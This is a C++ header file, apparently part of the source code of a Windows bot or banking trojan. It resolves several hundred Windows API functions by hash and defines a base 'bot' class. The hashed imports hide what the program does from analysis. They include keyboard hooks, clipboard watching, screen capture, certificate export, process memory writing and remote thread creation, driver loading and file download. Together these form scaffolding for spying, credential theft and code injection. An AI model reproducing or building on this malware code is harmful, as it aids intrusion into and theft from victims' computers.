#define pGetKeyboardLayoutNameA		pushargEx< DLL_USER32, 0xEA0FAD78, 253 >
#define pOpenClipboard				pushargEx< DLL_USER32, 0x6ADFC795, 254 >
#define pGetClipboardData			pushargEx< DLL_USER32, 0x8E7AE818, 255 >
#define pCloseClipboard				pushargEx< DLL_USER32, 0xF0EC2212, 256 >
#define pGetWindowTextA				pushargEx< DLL_USER32, 0x9C29100A, 257 >
#define pGetWindowTextW				pushargEx< DLL_USER32, 0x9C29101C, 258 >
#define pGetForegroundWindow		pushargEx< DLL_USER32, 0xCACD450, 259 >
#define pGetWindowLongPtrA			pushargEx< DLL_USER32, 0x1D6C998B, 260 >
#define pGetWindowLongPtrW			pushargEx< DLL_USER32, 0x1D6C999D, 261 >
#define pEnumChildWindows			pushargEx< DLL_USER32, 0xAE8A5532, 262 >
#define pGetParent					pushargEx< DLL_USER32, 0x5992A5F2, 263 >
#define pGetDesktopWindow			pushargEx< DLL_USER32, 0xCD4AC62B, 264 >
#define pIsWindowVisible			pushargEx< DLL_USER32, 0xCFAAD7BF, 265 >
#define pIsWindowUnicode            pushargEx< DLL_USER32, 0x6EE99F86, 266 >
#define pSetWindowLongA				pushargEx< DLL_USER32, 0xBD6C998B, 267 >
#define pSetWindowLongW				pushargEx< DLL_USER32, 0xBD6C999D, 268 >
#define pGetWindowLongA				pushargEx< DLL_USER32, 0x1D6C998B, 269 >
#define pGetWindowLongW				pushargEx< DLL_USER32, 0x1D6C999D, 270 >
#define pSetLayeredWindowAttributes	pushargEx< DLL_USER32, 0x2DDBD2AF, 271 >
#define pSetWindowPos				pushargEx< DLL_USER32, 0xA92DF5AF, 272 >
#define pMessageBoxA				pushargEx< DLL_USER32, 0xABBC680D, 273 >
#define pMessageBoxW				pushargEx< DLL_USER32, 0xABBC681B, 274 >
#define pGetClassNameW				pushargEx< DLL_USER32, 0x484006A, 275 >
#define pGetClassNameA				pushargEx< DLL_USER32, 0x484007C, 276 >
#define pShowWindow					pushargEx< DLL_USER32, 0x7506E960, 277 >
#define pSendMessageW				pushargEx< DLL_USER32, 0x58A81C3F, 278 >
#define pSendMessageA				pushargEx< DLL_USER32, 0x58A81C29, 279 >
#define pEnumWindows				pushargEx< DLL_USER32, 0x9940B5CA, 280 >
#define pIsWindow					pushargEx< DLL_USER32, 0x9D4AF949, 281 >
#define pWaitForInputIdle			pushargEx< DLL_USER32, 0x4FAC81B4, 282 >
#define pGetWindow					pushargEx< DLL_USER32, 0xDA12E549, 283 >
#define pCreateDesktopW				pushargEx< DLL_USER32, 0xC43ED7B1, 284 >
#define pCreateDesktopA				pushargEx< DLL_USER32, 0xC43ED7A7, 285 >
#define pGetThreadDesktop			pushargEx< DLL_USER32, 0x79F9B7FA, 286 >
#define pSwitchDesktop				pushargEx< DLL_USER32, 0x5B92DEA5, 287 >
#define pSetThreadDesktop			pushargEx< DLL_USER32, 0x79F99FFA, 288 >
#define pGetTopWindow				pushargEx< DLL_USER32, 0xC90E0C33, 289 >
#define pMoveWindow					pushargEx< DLL_USER32, 0x7234A16F, 290 >
#define pFindWindowExA				pushargEx< DLL_USER32, 0xAD4FFCD5, 291 >
#define pGetMessageA				pushargEx< DLL_USER32, 0xC8A274AC, 292 >
#define pSendMessageTimeoutW		pushargEx< DLL_USER32, 0x65846C69, 293 >
#define pSendMessageTimeoutA 		pushargEx< DLL_USER32, 0x65846C7F, 294 >
#define pSetClipboardViewer			pushargEx< DLL_USER32, 0x322391FC, 295 >
#define pIsClipboardFormatAvailable	pushargEx< DLL_USER32, 0xB161BF96, 296 >
#define pChangeClipboardChain   	pushargEx< DLL_USER32, 0x7CF84417, 297 >
#define pPostMessageA				pushargEx< DLL_USER32, 0xC8A87EA7, 298 >
#define pGetMessagePos 				pushargEx< DLL_USER32, 0x9D2F45DB, 299 >
#define pClientToScreen 			pushargEx< DLL_USER32, 0x543DF505, 300 >
#define pGetWindowRect  			pushargEx< DLL_USER32, 0x97F85FA0, 301 >
#define pDefWindowProcA 			pushargEx< DLL_USER32, 0xC6CE9B8A, 302 >
#define pCallWindowProcA 			pushargEx< DLL_USER32, 0xEE5FDA87, 303 >
#define pGetKeyNameTextW 			pushargEx< DLL_USER32, 0xAD34F519, 304 >
#define pGetKeyboardState			pushargEx< DLL_USER32, 0xF5E780A6, 305 >
#define pGetKeyboardLayout			pushargEx< DLL_USER32, 0xA0C69BF7, 306 >
#define pToUnicodeEx    			pushargEx< DLL_USER32, 0x2944D0D1, 307 >
#define pLoadCursorW    			pushargEx< DLL_USER32, 0xCFB2E5CF, 308 >
#define pLoadCursorA    			pushargEx< DLL_USER32, 0xCFB2E5D9, 309 >
#define pRegisterClassA    			pushargEx< DLL_USER32, 0xAEABC9A4, 310 >
#define pCreateWindowExA   			pushargEx< DLL_USER32, 0xBF7EFB5A, 311 >
#define pTranslateMessage   		pushargEx< DLL_USER32, 0xC45D9631, 312 >
#define pDispatchMessageA   		pushargEx< DLL_USER32, 0x4BAED1C8, 313 >
#define pGetWindowDC   				pushargEx< DLL_USER32, 0xB95254C7, 314 >
#define pReleaseDC					pushargEx< DLL_USER32, 0x4CB2D16D, 315 >
#define pFillRect					pushargEx< DLL_USER32, 0xCAD4D692, 316 >
#define pCallWindowProcA		   	pushargEx< DLL_USER32, 0xEE5FDA87, 317 >
#define pCallWindowProcW			pushargEx< DLL_USER32, 0xEE5FDA91, 318 >
#define pSetTimer       			pushargEx< DLL_USER32, 0x4D9CE557, 319 >
#define pDestroyWindow      		pushargEx< DLL_USER32, 0xEB4A6DB3, 320 >
#define pGetFocus           		pushargEx< DLL_USER32, 0x6D776D57, 321 >
#define pCharLowerBuffA        		pushargEx< DLL_USER32, 0x5FDA1871, 322 >
#define pCharUpperBuffA        		pushargEx< DLL_USER32, 0xC0D4187D, 323 >
#define pwvsprintfA 				pushargEx< DLL_USER32, 0x6B3AF0EC, 324 >
#define pwvsprintfW 				pushargEx< DLL_USER32, 0x6B3AF0FA, 325 >
#define pSetWindowsHookExA 			pushargEx< DLL_USER32, 0xB4584DDA, 326 >
#define pSetWindowsHookExW 			pushargEx< DLL_USER32, 0xB4584DCC, 327 >
#define pUnhookWindowsHookEx 		pushargEx< DLL_USER32, 0xB800C8A6, 328 >
#define pSetWindowTextA 			pushargEx< DLL_USER32, 0x3C29100A, 329 >
#define pSetWindowTextW 			pushargEx< DLL_USER32, 0x3C29101C, 330 >
#define pSetWindowLongPtrA			pushargEx< DLL_USER32, 0x334A94D2, 331 >
#define pSetWindowLongPtrW			pushargEx< DLL_USER32, 0x334A94C4, 332 >
#define pScreenToClient				pushargEx< DLL_USER32, 0xBDAE901A, 333 >
#define pGetClientRect				pushargEx< DLL_USER32, 0xA2F65BA2, 334 >
#define pGetDlgItem					pushargEx< DLL_USER32, 0x9CD421A8, 335 >
#define pCallNextHookEx				pushargEx< DLL_USER32, 0x8616AB9B, 336 >
#define pGetCursor					pushargEx< DLL_USER32, 0x199725ED, 337 >
#define pSetCursor					pushargEx< DLL_USER32, 0xD9725ED, 338 >
#define pGetAncestor			 	pushargEx< DLL_USER32, 0xAAFE9D1E, 339 >
#define pRegisterWindowMessageA	 	pushargEx< DLL_USER32, 0xE5D2B59, 340 >
#define pFindWindowA	        	pushargEx< DLL_USER32, 0x252B53B, 341 >
#define pGetDC			        	pushargEx< DLL_USER32, 0x7CBD2247, 342 >
#define pGetClassLongA	        	pushargEx< DLL_USER32, 0x2544C17C, 343 >
#define pPrintWindow	        	pushargEx< DLL_USER32, 0xF404F170, 344 >
#define pGetWindowPlacement	       	pushargEx< DLL_USER32, 0xE06982CE, 345 >
#define pIsIconic			       	pushargEx< DLL_USER32, 0x3D687AAD, 346 >
#define pSetFocus			       	pushargEx< DLL_USER32, 0x6D5F6D57, 347 >
#define pSetActiveWindow			pushargEx< DLL_USER32, 0xDB7C98FC, 348 >
#define pSetCursorPos				pushargEx< DLL_USER32, 0xBDB58517, 349 >
#define pAttachThreadInput			pushargEx< DLL_USER32, 0xE16B4137, 350 >
#define pUpdateWindow				pushargEx< DLL_USER32, 0xFC3A1D7B, 351 >
#define pDestroyMenu				pushargEx< DLL_USER32, 0x6A50AD38, 352 >
#define pmouse_event				pushargEx< DLL_USER32, 0xAB3EFAFD, 353 >
#define pSetCapture					pushargEx< DLL_USER32, 0xEB747643, 354 >
#define pReleaseCapture				pushargEx< DLL_USER32, 0x6B0BEF18, 355 >
#define pBlockInput					pushargEx< DLL_USER32, 0xF103B589, 356 >

//winsock
#define pWSACleanup 				pushargEx< DLL_WINSOCK, 0x8FB8B5BD, 357 >
#define pWSAStartup 				pushargEx< DLL_WINSOCK, 0xCDDE757D, 358 >
#define psocket 					pushargEx< DLL_WINSOCK, 0xFC7AF16A, 359 >
#define pclosesocket 				pushargEx< DLL_WINSOCK, 0x939D7D9C, 360 >
#define paccept 					pushargEx< DLL_WINSOCK, 0x3C797B7A, 361 >
#define pbind 						pushargEx< DLL_WINSOCK, 0xC5A7764, 362 >
#define phtons 						pushargEx< DLL_WINSOCK, 0x8E9BF775, 363 >
#define plisten 					pushargEx< DLL_WINSOCK, 0x9E7D3188, 364 >
#define precv 						pushargEx< DLL_WINSOCK, 0xE5971F6, 365 >
#define psend 						pushargEx< DLL_WINSOCK, 0xE797764, 366 >
#define pconnect 					pushargEx< DLL_WINSOCK, 0xEDD8FE8A, 367 >
#define pshutdown 					pushargEx< DLL_WINSOCK, 0x4C7C5841, 368 >
#define pgethostbyname 				pushargEx< DLL_WINSOCK, 0xF44318C6, 369 >
#define pgethostbyaddr 				pushargEx< DLL_WINSOCK, 0xF5A25C51, 370 >
#define pinet_addr 					pushargEx< DLL_WINSOCK, 0x95E4A5D7, 371 >
#define pinet_ntoa 					pushargEx< DLL_WINSOCK, 0x9400A044, 372 >
#define pgetaddrinfo				pushargEx< DLL_WINSOCK, 0xD9F839BA, 373 >
#define pgetpeername				pushargEx< DLL_WINSOCK, 0xD939F838, 374 >
#define pselect						pushargEx< DLL_WINSOCK, 0x5D99726A, 375 >
#define psetsockopt					pushargEx< DLL_WINSOCK, 0xD8923733, 376 >
#define pWSAGetLastError			pushargEx< DLL_WINSOCK, 0x8E878072, 377 >
#define pWSASetLastError			pushargEx< DLL_WINSOCK, 0x8E850072, 378 >
#define pioctlsocket		     	pushargEx< DLL_WINSOCK, 0x1F935B1D, 379 >
#define pWSAFDIsSet   		     	pushargEx< DLL_WINSOCK, 0x4DFC1F3B, 380 >

//ntdll
#define pRtlInitUnicodeString 		pushargEx< DLL_NTDLL, 0x3287EC73, 381 >
#define pRtlInitAnsiString			pushargEx< DLL_NTDLL, 0xEE02056A, 382 >
#define pNtOpenFile 				pushargEx< DLL_NTDLL, 0x9C45B56C, 383 >
#define pNtOpenDirectoryObject 		pushargEx< DLL_NTDLL, 0xF5F11CF0, 384 >
#define pNtCreateSection 			pushargEx< DLL_NTDLL, 0x6E6F608B, 385 >
#define pNtOpenSection 				pushargEx< DLL_NTDLL, 0x5FA9AB38, 386 >
#define pZwLoadDriver 				pushargEx< DLL_NTDLL, 0x42F57D33, 387 >
#define pZwUnloadDriver 			pushargEx< DLL_NTDLL, 0x95849B61, 388 >
#define pRtlAdjustPrivilege 		pushargEx< DLL_NTDLL, 0xC2A6B1AE, 389 >
#define pZwMakeTemporaryObject 		pushargEx< DLL_NTDLL, 0x128CE9D3, 390 >
#define pNtClose 					pushargEx< DLL_NTDLL, 0x3D9AC241, 391 >
#define pRtlImageNtHeader			pushargEx< DLL_NTDLL, 0xDD39FD14, 392 >
#define pZwQuerySystemInformation	pushargEx< DLL_NTDLL, 0xBC44A131, 393 >
#define pZwUnmapViewOfSection		pushargEx< DLL_NTDLL, 0x9ED4D161, 394 >
#define pZwMapViewOfSection			pushargEx< DLL_NTDLL, 0x594D9A3C, 395 >
#define pZwQueueApcThread			pushargEx< DLL_NTDLL, 0xC0E4F6EE, 396 >
#define pZwResumeThread				pushargEx< DLL_NTDLL, 0xACF8BF39, 397 >
#define pZwTestAlert				pushargEx< DLL_NTDLL, 0xC952A06B, 398 >
#define pZwQueryInformationThread	pushargEx< DLL_NTDLL, 0xFAEDF3AA, 399 >
#define pZwOpenProcess				pushargEx< DLL_NTDLL, 0x9C0AC99D, 400 >
#define pZwOpenProcessToken			pushargEx< DLL_NTDLL, 0xADACBE07, 401 >
#define pZwClose					pushargEx< DLL_NTDLL, 0x3D9A9259, 402 >
#define pZwAllocateVirtualMemory	pushargEx< DLL_NTDLL, 0x594AA9E4, 403 >
#define pZwFreeVirtualMemory		pushargEx< DLL_NTDLL, 0xBED3922C, 404 >
#define pZwWriteVirtualMemory		pushargEx< DLL_NTDLL, 0xEEE7AF23, 405 >
#define pZwProtectVirtualMemory		pushargEx< DLL_NTDLL, 0x3836C63E, 406 >
#define pRtlCreateUserThread		pushargEx< DLL_NTDLL, 0xE9E0A4F7, 407 >
#define pLdrLoadDll					pushargEx< DLL_NTDLL, 0x78740534, 408 >
#define pLdrGetDllHandle			pushargEx< DLL_NTDLL, 0x7E287C6A, 409 >
#define pLdrGetProcedureAddress		pushargEx< DLL_NTDLL, 0x323C2875, 410 >
#define pZwSetContextThread			pushargEx< DLL_NTDLL, 0x62E2FE6F, 411 >
#define pZwSetInformationProcess	pushargEx< DLL_NTDLL, 0xCA2BF652, 412 >
#define pZwQueryInformationProcess	pushargEx< DLL_NTDLL, 0xA638CE5F, 413 >
#define pRtlImageDirectoryEntryToData pushargEx< DLL_NTDLL, 0x503f7b28, 414 >
#define pZwQueryInformationFile		pushargEx< DLL_NTDLL, 0x0f7ba4b7, 415 >
#define pZwShutdownSystem			pushargEx< DLL_NTDLL, 0x6F1C809E, 416 >

//winsta
#define pWinStationTerminateProcess	pushargEx< DLL_WINSTA, 0xA60C5F05, 417 >

//shell32
#define pSHGetSpecialFolderPathA 	pushargEx< DLL_SHELL32, 0xC95D8550, 418 >
#define pSHGetSpecialFolderPathW 	pushargEx< DLL_SHELL32, 0xC95D8546, 419 >
#define pFindExecutableA			pushargEx< DLL_SHELL32, 0x37707500, 420 >
#define pFindExecutableW			pushargEx< DLL_SHELL32, 0x37707516, 421 >
#define pSHGetFolderPathA			pushargEx< DLL_SHELL32, 0xDEAA9541, 422 >
#define pSHGetFolderPathW			pushargEx< DLL_SHELL32, 0xDEAA9557, 423 >
#define pShellExecuteW				pushargEx< DLL_SHELL32, 0x570BC88F, 424 >
#define pShellExecuteA				pushargEx< DLL_SHELL32, 0x570BC899, 425 >
#define pStrStrIW 					pushargEx< DLL_SHELL32, 0x3E3B7742, 426 > //	PTSTR StrStrI(PTSTR pszFirst,PCTSTR pszSrch);
#define pStrStrIA 					pushargEx< DLL_SHELL32, 0x3E3B7754, 427 >
#define pShellExecuteExA			pushargEx< DLL_SHELL32, 0xf2276983, 428 >
#define pShellExecuteExW			pushargEx< DLL_SHELL32, 0xf2276995, 429 >
#define pSHFileOperationA			pushargEx< DLL_SHELL32, 0x8B6D020B, 430 >
#define pSHFileOperationW			pushargEx< DLL_SHELL32, 0x8B6D021D, 431 >


//wininet
#define pInternetConnectA 			pushargEx< DLL_WININET, 0xBE618D3E, 432 >
#define pInternetConnectW 			pushargEx< DLL_WININET, 0xBE618D28, 433 >
#define pHttpOpenRequestA 			pushargEx< DLL_WININET, 0x1510002F, 434 >
#define pHttpOpenRequestW 			pushargEx< DLL_WININET, 0x15100039, 435 >
#define pHttpSendRequestA 			pushargEx< DLL_WININET, 0x9F13856A, 436 >
#define pHttpSendRequestW 			pushargEx< DLL_WININET, 0x9F13857C, 437 >
#define pInternetCloseHandle 		pushargEx< DLL_WININET, 0x7314FB0C, 438 >
#define pInternetQueryOptionA 		pushargEx< DLL_WININET, 0x2AE71934, 439 >
#define pInternetQueryOptionW 		pushargEx< DLL_WININET, 0x2AE71922, 440 >
#define pInternetSetOptionA 		pushargEx< DLL_WININET, 0x1AD09C78, 441 >
#define pInternetSetStatusCallback 	pushargEx< DLL_WININET, 0x9EF6461, 442 >
#define pHttpQueryInfoA 			pushargEx< DLL_WININET, 0x2F5CE027, 443 >
#define pHttpQueryInfoW 			pushargEx< DLL_WININET, 0x2F5CE031, 444 >
#define pHttpAddRequestHeadersA		pushargEx< DLL_WININET, 0xB5901061, 445 >
#define pHttpAddRequestHeadersW		pushargEx< DLL_WININET, 0xB5901077, 446 >
#define pGetUrlCacheEntryInfoW 		pushargEx< DLL_WININET, 0x57FBC0CB, 447 >
#define pGetUrlCacheEntryInfoA 		pushargEx< DLL_WININET, 0x57FBC0DD, 448 >
#define pFindFirstUrlCacheEntryA	pushargEx< DLL_WININET, 0xDDCB15D, 449 >
#define pFindNextUrlCacheEntryA		pushargEx< DLL_WININET, 0x8733D614, 450 >
#define pDeleteUrlCacheEntry		pushargEx< DLL_WININET, 0xA3A80AB6, 451 >
#define pFindCloseUrlCache			pushargEx< DLL_WININET, 0xFDE87743, 452 >
#define pInternetOpenA				pushargEx< DLL_WININET, 0x8593DD7, 453 >
#define pInternetOpenUrlA			pushargEx< DLL_WININET, 0xB87DBD66, 454 >
#define pInternetReadFile			pushargEx< DLL_WININET, 0x1A212962, 455 >
#define pInternetReadFileExA		pushargEx< DLL_WININET, 0x2C523864, 456 >
#define pInternetReadFileExW		pushargEx< DLL_WININET, 0x2C523872, 457 >
#define pReadUrlCacheEntryStream	pushargEx< DLL_WININET, 0x1672BC16, 458 >
#define pUnlockUrlCacheEntryStream	pushargEx< DLL_WININET, 0xEE22C82A, 459 >
#define pRetrieveUrlCacheEntryStreamA	pushargEx< DLL_WININET, 0x609C6936, 460 >
#define pFindFirstUrlCacheEntryExA  pushargEx< DLL_WININET, 0x2C567F36, 461 >
#define pFindNextUrlCacheEntryExA	pushargEx< DLL_WININET, 0xF5841D8D, 462 >
#define pDeleteUrlCacheEntryA		pushargEx< DLL_WININET, 0xD4055B10, 463 >
#define pCreateUrlCacheEntryA		pushargEx< DLL_WININET, 0x10815BF5, 464 >
#define pCommitUrlCacheEntryA		pushargEx< DLL_WININET, 0x548D61B6, 465 >


//urlmon
#define pURLDownloadToFileA			pushargEx< DLL_URLMON, 0xD95D2399, 466 >
#define pURLDownloadToFileW			pushargEx< DLL_URLMON, 0xD95D238F, 467 >
#define pObtainUserAgentString		pushargEx< DLL_URLMON, 0x534D481, 468 >


/* gdi32.dll */
#define pCreateCompatibleBitmap		  pushargEx< DLL_GDI, 0x6B3470D5, 469 >
#define pCreateCompatibleDC		      pushargEx< DLL_GDI, 0x5AF0017C, 470 >
#define pSelectObject       	      pushargEx< DLL_GDI, 0x4894DAFC, 471 >
#define pBitBlt             	      pushargEx< DLL_GDI, 0x9E90B462, 472 >
#define pDeleteDC            	      pushargEx< DLL_GDI, 0x5E10F525, 473 >
#define pDeleteObject           	  pushargEx< DLL_GDI, 0x48B87EFC, 474 >
#define pGetDeviceCaps           	  pushargEx< DLL_GDI, 0x39E9624F, 475 >
#define pCreateSolidBrush             pushargEx< DLL_GDI, 0xEF9AC06E, 476 >


/* gdiplus.dll */
#define pGdiplusStartup		          pushargEx< DLL_GDIPLUS, 0x55F74962, 477 >
#define pGdipCreateBitmapFromHBITMAP  pushargEx< DLL_GDIPLUS, 0xB7F0B572, 478 >
#define pGdipSaveImageToFile		  pushargEx< DLL_GDIPLUS, 0xE410B3EB, 479 >
#define pGdipDisposeImage	          pushargEx< DLL_GDIPLUS, 0x226FA923, 480 >
#define pGdiplusShutdown		      pushargEx< DLL_GDIPLUS, 0x99A24264, 481 >


//crypt32
#define pCertOpenSystemStoreA				pushargEx< DLL_CRYPT32, 0xEEA9ED9D, 482 >
#define pCertEnumCertificatesInStore		pushargEx< DLL_CRYPT32, 0x9897E094, 483 >
#define pPFXExportCertStoreEx				pushargEx< DLL_CRYPT32, 0xDFDB467E, 484 >
#define pCertCloseStore						pushargEx< DLL_CRYPT32, 0xCC1A6B6B, 485 >
#define pPFXImportCertStore					pushargEx< DLL_CRYPT32, 0x3A1B7F5D, 486 >
#define pCertAddCertificateContextToStore	pushargEx< DLL_CRYPT32, 0xDC6DD6E5, 487 >
#define pCertDuplicateCertificateContext	pushargEx< DLL_CRYPT32, 0x2F16F47, 488 >
#define pCertDeleteCertificateFromStore		pushargEx< DLL_CRYPT32, 0x5B08B5F, 489 >


//
//psapi.dll
#define	pGetMappedFileNameA			pushargEx< DLL_PSAPI, 0x860331a8, 490 >
#define pEnumProcessModules			pushargEx< DLL_PSAPI, 0x189F16C9, 491 >
#define pGetModuleBaseNameA			pushargEx< DLL_PSAPI, 0x7353EFE8, 492 >
#define pGetModuleFileNameExA		pushargEx< DLL_PSAPI, 0xE4FB2191, 493 >


//
//shlwapi.dll 
#define	pPathFindFileNameA			pushargEx< DLL_SHLWAPI, 0xeed5398c, 494 >
#define pPathCombineA				pushargEx< DLL_SHLWAPI, 0x45B615D5, 495 >
#define pStrStrA					pushargEx< DLL_SHLWAPI, 0x2A7C76E6, 496 >
#define pPathRemoveFileSpecA		pushargEx< DLL_SHLWAPI, 0xE6E3EE01, 497 >
#define pStrToIntA					pushargEx< DLL_SHLWAPI, 0xAAD270E7, 498 >
#define pStrToInt64ExA				pushargEx< DLL_SHLWAPI, 0xC3C5B48, 499 >
#define pPathAppendA				pushargEx< DLL_SHLWAPI, 0xF86AA1F6, 500 >
#define pPathAppendW				pushargEx< DLL_SHLWAPI, 0xF86AA1E0, 501 >
#define pPathIsDirectoryEmptyA		pushargEx< DLL_SHLWAPI, 0xCA98893B, 502 >


//Iphlpapi.dll
#define	pGetIpNetTable				pushargEx< DLL_IPHLPAPI, 0xB8D99CE4, 503 >
#define	pGetAdaptersInfo			pushargEx< DLL_IPHLPAPI, 0xE69A1CD7, 504 >



//odbc32
#define pSQLAllocHandle				pushargEx< DLL_ODBC32, 0xEC1F2857, 505 >
#define pSQLSetEnvAttr				pushargEx< DLL_ODBC32, 0x88EE1E2C, 506 >
#define pSQLConnectA				pushargEx< DLL_ODBC32, 0x203F51DF, 507 >
#define pSQLDriverConnectA			pushargEx< DLL_ODBC32, 0x3941DBB7, 508 >
#define pSQLPrepareA				pushargEx< DLL_ODBC32, 0xC09D6D06, 509 >
#define pSQLBindCol					pushargEx< DLL_ODBC32, 0x3D09FC8B, 510 >
#define pSQLExecute					pushargEx< DLL_ODBC32, 0x8DE46D8A, 511 >
#define pSQLFetch					pushargEx< DLL_ODBC32, 0x6C1A778C, 512 >
#define pSQLCloseCursor				pushargEx< DLL_ODBC32, 0xACA2F119, 513 >
#define pSQLFreeHandle				pushargEx< DLL_ODBC32, 0x6A289300, 514 >
#define pSQLDisconnect				pushargEx< DLL_ODBC32, 0x8104CDA8, 515 >
#define pSQLBindParameter			pushargEx< DLL_ODBC32, 0xE8536508, 516 >
#define pSQLGetDiagRecA				pushargEx< DLL_ODBC32, 0x13C9473F, 517 >

//version.dll
#define pGetFileVersionInfoSizeA	pushargEx< DLL_VERSION, 0x8A94F707, 518 >
#define pGetFileVersionInfoA		pushargEx< DLL_VERSION, 0x7AA45C7A, 519 >
#define pVerQueryValueA				pushargEx< DLL_VERSION, 0x4E26C00F, 520 >

// ole32.dll
#define pCoCreateGuid				pushargEx< DLL_OLE32, 0xAA3E88A3, 521 >





//****************************************************************
//  Вспомогательные функции
//****************************************************************

#define Min(a,b) (((a) < (b)) ? (a) : (b))
#define Max(a,b) (((a) > (b)) ? (a) : (b))


//****************************************************************
//  TBotClass - базовый класс бота
//****************************************************************


class TBotObject
{
public:
	virtual ~TBotObject() {}

	void* operator new(size_t size);
	void* operator new[](size_t size);
	void  operator delete(void* Pointer);
	void  operator delete[](void* Pointer);
};


//----------------------------------------------------------------------------
#endif
